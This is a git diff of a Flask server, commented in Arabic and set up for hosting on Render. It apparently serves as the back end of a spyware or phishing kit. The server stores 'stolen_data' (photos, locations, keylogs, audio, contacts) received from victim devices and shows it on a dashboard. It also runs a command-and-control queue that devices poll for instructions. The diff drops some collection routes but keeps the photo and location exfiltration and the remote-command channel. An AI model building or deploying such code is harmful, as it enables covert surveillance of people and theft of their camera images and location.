@@ -1,11 +1,14 @@
 from flask import Flask, render_template, request, jsonify
 import os
-import json
 from datetime import datetime
 
-app = Flask(__name__)
+# إعداد المسارات المطلقة لضمان عمل templates على سيرفر Render
+base_dir = os.path.abspath(os.path.dirname(__file__))
+app = Flask(__name__, 
+            template_folder=os.path.join(base_dir, 'templates'),
+            static_folder=os.path.join(base_dir, 'static'))
 
-# ===== تخزين البيانات =====
+# تخزين البيانات في الذاكرة (للعرض السريع)
 stolen_data = {
     "photos": [],
     "audio": [],
@@ -14,8 +17,9 @@ stolen_data = {
     "contacts": [],
     "files": []
 }
+pending_commands = []
 
-# ===== الصفحات =====
+# ===== الصفحات الرئيسية (تأكد من وجود الملفات داخل مجلد templates) =====
 @app.route('/')
 def index():
     return render_template('index.html')
@@ -30,28 +34,15 @@ def qr_vector():
 
 @app.route('/dashboard')
 def dashboard():
+    # هذا الرابط سيفتح لوحة التحكم الآن
     return render_template('dashboard.html')
 
-# ===== API البيانات =====
+# ===== API البيانات للوحة التحكم =====
 @app.route('/api/dashboard/data')
 def dashboard_data():
     return jsonify(stolen_data)
 
-# ===== استقبال البيانات =====
-@app.route('/api/upload', methods=['POST'])
-def upload():
-    data = request.json
-    if not data:
-        return jsonify({"status": "error"}), 400
-    t = data.get('type')
-    if t in stolen_data:
-        stolen_data[t].append({
-            "timestamp": datetime.now().isoformat(),
-            "ip": request.remote_addr,
-            "content": data.get('content', '')
-        })
-    return jsonify({"status": "ok"})
-
+# ===== استقبال البيانات (الكاميرا، الموقع، الخ) =====
 @app.route('/api/upload/photo', methods=['POST'])
 def upload_photo():
     data = request.json
@@ -71,80 +62,27 @@ def upload_location():
         stolen_data["locations"].append({
             "timestamp": datetime.now().isoformat(),
             "lat": data.get('lat'),
-            "lng": data.get('lng'),
-            "accuracy": data.get('accuracy')
+            "lng": data.get('lng')
         })
     return jsonify({"status": "ok"})
 
-@app.route('/api/upload/contacts', methods=['POST'])
-def upload_contacts():
-    data = request.json
-    if data:
-        stolen_data["contacts"].append({
-            "timestamp": datetime.now().isoformat(),
-            "contacts": data.get('contacts', [])
-        })
-    return jsonify({"status": "ok"})
-
-@app.route('/api/upload/keylog', methods=['POST'])
-def upload_keylog():
-    data = request.json
-    if data:
-        stolen_data["keylogs"].append({
-            "timestamp": datetime.now().isoformat(),
-            "keys": data.get('keys', '')
-        })
-    return jsonify({"status": "ok"})
-
-@app.route('/api/upload/audio', methods=['POST'])
-def upload_audio():
-    data = request.json
-    if data and 'audio' in data:
-        stolen_data["audio"].append({
-            "timestamp": datetime.now().isoformat(),
-            "duration": data.get('duration', 'unknown'),
-            "full_audio": data['audio']
-        })
-    return jsonify({"status": "ok"})
-
-# ===== أوامر التحكم =====
-pending_commands = []
-
+# ===== أوامر التحكم (Polling) =====
 @app.route('/api/command/send', methods=['POST'])
 def send_command():
     data = request.json
     if not data or 'type' not in data:
         return jsonify({"status": "error"}), 400
-    cmd = {
-        "id": str(len(pending_commands) + 1),
-        "type": data['type'],
-        "params": data.get('params', {}),
-        "timestamp": datetime.now().isoformat()
-    }
+    cmd = {"id": str(len(pending_commands) + 1), "type": data['type'], "params": data.get('params', {})}
     pending_commands.append(cmd)
-    return jsonify({"status": "ok", "command_id": cmd["id"]})
-
-@app.route('/api/command/poll')
-def poll_commands():
-    if pending_commands:
-        cmd = pending_commands.pop(0)
-        return jsonify({"command": cmd})
-    return jsonify({"command": None})
-
-@app.route('/api/command/status', methods=['POST'])
-def command_status():
     return jsonify({"status": "ok"})
 
-# ===== تشغيل =====
+@app.route('/api/command/poll')
+def poll():
+    if pending_commands:
+        return jsonify({"command": pending_commands.pop(0)})
+    return jsonify({"command": None})
+
+# ===== التشغيل المتوافق مع Render =====
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
-    # استخدام waitress للإنتاج
-    try:
-        from waitress import serve
-        print(f"[+] Running on 0.0.0.0:{port} with waitress")
-        serve(app, host='0.0.0.0', port=port)
-    except ImportError:
-        app.run(host='0.0.0.0', port=port, debug=True)
-else:
-    # Render يستخدم هذا المسار
-    pass
+    app.run(host='0.0.0.0', port=port)
